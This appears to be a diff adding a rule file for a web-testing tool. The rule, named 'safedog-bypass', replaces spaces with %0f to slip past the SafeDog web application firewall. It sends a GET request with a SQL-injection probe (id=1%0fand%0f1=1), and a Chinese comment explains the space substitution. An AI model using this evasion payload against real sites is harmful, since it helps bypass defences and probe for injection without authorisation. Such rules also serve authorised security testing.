@@ -1,0 +1,12 @@
+# @name: safedog-bypass
+# @tags: get,safedog,id,bypass,space-0x0f
+# @color: green
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: replace_space
+# @intent.replace_from: " "
+# @intent.replace_to: %0f
+# @note: 将后续流量中的空格替换为 %0f，本规则使用 /wap?id=1%0fand%0f1=1 进行探测。
+GET /wap?id=1%0fand%0f1=1 HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
